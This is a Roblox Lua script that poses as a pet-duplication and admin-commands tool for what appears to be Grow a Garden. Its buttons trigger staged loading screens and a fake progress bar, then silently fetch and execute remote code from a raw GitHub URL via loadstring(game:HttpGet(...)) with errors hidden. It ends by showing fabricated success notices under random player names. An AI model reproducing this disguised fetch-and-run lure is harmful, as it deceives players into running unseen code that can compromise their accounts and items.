--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Cleanup
for _, gui in ipairs(playerGui:GetChildren()) do
	if gui.Name == "CustomGui" or gui.Name == "LoadingScreen" or gui.Name == "ScriptWaitUI" or gui.Name == "Notifications" then
		gui:Destroy()
	end
end

--// Notification Handler
local function showNotification(text)
	local notifGui = playerGui:FindFirstChild("Notifications") or Instance.new("ScreenGui", playerGui)
	notifGui.Name = "Notifications"
	notifGui.ResetOnSpawn = false
	notifGui.IgnoreGuiInset = true

	local holder = notifGui:FindFirstChild("Holder")
	if not holder then
		holder = Instance.new("Frame", notifGui)
		holder.Name = "Holder"
		holder.Size = UDim2.new(0, 300, 1, 0)
		holder.Position = UDim2.new(1, -310, 0, 0)
		holder.BackgroundTransparency = 1

		local layout = Instance.new("UIListLayout", holder)
		layout.SortOrder = Enum.SortOrder.LayoutOrder
		layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
		layout.Padding = UDim.new(0, 6)
	end

	local notif = Instance.new("Frame")
	notif.Size = UDim2.new(1, 0, 0, 50)
	notif.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	notif.BackgroundTransparency = 1
	notif.Parent = holder
	Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 8)

	local txt = Instance.new("TextLabel", notif)
	txt.Size = UDim2.new(1, -10, 1, 0)
	txt.Position = UDim2.new(0, 5, 0, 0)
	txt.BackgroundTransparency = 1
	txt.Font = Enum.Font.GothamSemibold
	txt.TextColor3 = Color3.fromRGB(255, 255, 255)
	txt.TextSize = 16
	txt.TextXAlignment = Enum.TextXAlignment.Left
	txt.Text = text

	-- Animate in
	TweenService:Create(notif, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()

	-- Auto destroy after 2 seconds
	task.delay(2, function()
		TweenService:Create(notif, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
		wait(0.5)
		notif:Destroy()
	end)
end

--// MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local frame = Instance.new("Frame", mainGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local layout = Instance.new("UIListLayout", frame)
layout.Padding = UDim.new(0, 12)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

local function createButton(text)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(0.8, 0, 0, 45)
	btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	btn.Font = Enum.Font.GothamSemibold
	btn.Text = text
	btn.TextSize = 22
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.AutoButtonColor = false
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
	end)

	return btn
end

--// Fullscreen Loading Screen
local function showLoadingScreen(message, callback)
	local scr = Instance.new("ScreenGui", playerGui)
	scr.Name = "LoadingScreen"
	scr.IgnoreGuiInset = true
	scr.ResetOnSpawn = false

	local bg = Instance.new("Frame", scr)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

	local box = Instance.new("Frame", bg)
	box.Size = UDim2.new(0.6, 0, 0.3, 0)
	box.Position = UDim2.new(0.5, 0, 0.5, 0)
	box.AnchorPoint = Vector2.new(0.5, 0.5)
	box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

	local lbl = Instance.new("TextLabel", box)
	lbl.Size = UDim2.new(0.9, 0, 0.3, 0)
	lbl.Position = UDim2.new(0.5, 0, 0.25, 0)
	lbl.AnchorPoint = Vector2.new(0.5, 0.5)
	lbl.BackgroundTransparency = 1
	lbl.Font = Enum.Font.GothamBold
	lbl.TextColor3 = Color3.fromRGB(240, 240, 240)
	lbl.TextSize = 24
	lbl.TextWrapped = true
	lbl.Text = message

	local percent = Instance.new("TextLabel", box)
	percent.Size = UDim2.new(0, 80, 0, 30)
	percent.Position = UDim2.new(0.5, 0, 0.5, 0)
	percent.AnchorPoint = Vector2.new(0.5, 0.5)
	percent.BackgroundTransparency = 1
	percent.Font = Enum.Font.Gotham
	percent.TextSize = 22
	percent.TextColor3 = Color3.fromRGB(200, 200, 200)
	percent.Text = "0%"

	local bgBar = Instance.new("Frame", box)
	bgBar.Size = UDim2.new(0.8, 0, 0, 10)
	bgBar.Position = UDim2.new(0.5, 0, 0.7, 0)
	bgBar.AnchorPoint = Vector2.new(0.5, 0.5)
	bgBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	Instance.new("UICorner", bgBar).CornerRadius = UDim.new(1, 0)

	local bar = Instance.new("Frame", bgBar)
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

	local function finish()
		-- Fade out
		local tweenOut = TweenInfo.new(0.4)
		TweenService:Create(box, tweenOut, {BackgroundTransparency = 1}):Play()
		TweenService:Create(lbl, tweenOut, {TextTransparency = 1}):Play()
		TweenService:Create(percent, tweenOut, {TextTransparency = 1}):Play()
		TweenService:Create(bgBar, tweenOut, {BackgroundTransparency = 1}):Play()
		TweenService:Create(bar, tweenOut, {BackgroundTransparency = 1}):Play()

		task.delay(0.5, function()
			scr:Destroy()
			callback()
		end)
	end

	task.spawn(function()
		for i = 1, 100 do
			percent.Text = i .. "%"
			bar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.03, true)
			wait(5 / 100)
		end
		finish()
	end)
end

--// Wait Script UI
local function showScriptWait()
	local scr = Instance.new("ScreenGui", playerGui)
	scr.Name = "ScriptWaitUI"
	scr.ResetOnSpawn = false

	local lbl = Instance.new("TextLabel", scr)
	lbl.Size = UDim2.new(0, 450, 0, 70)
	lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
	lbl.AnchorPoint = Vector2.new(0.5, 0.5)
	lbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	lbl.Font = Enum.Font.GothamSemibold
	lbl.TextSize = 28
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	lbl.Text = "Please Wait Loading Script"
	Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 16)

	local running = true
	task.spawn(function()
		while running do
			for d = 0, 3 do
				lbl.Text = "Please Wait Loading Script" .. string.rep(".", d)
				wait(0.5)
			end
		end
	end)

	task.delay(3, function()
		running = false
		scr:Destroy()
	end)
end

--// Button Logic
local function onClick(isDupe)
	mainGui.Enabled = false

	local message = isDupe
		and "Finding A Compatible Server to Duplicate, Please Wait…"
		or "Finding a Compatible Server For Admin Commands, Please Wait…"

	showLoadingScreen(message, function()
		showScriptWait()

		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
		end)

		local randomNames = {"MasterMaker321", "DarkBlade77", "PixelPro456", "VoidHunter", "Slayer202"}
		local chosenName = randomNames[math.random(1, #randomNames)]
		showNotification(chosenName .. " Successfully Duped a Pet!")
	end)
end

--// Create Buttons
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function() onClick(false) end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function() onClick(true) end)
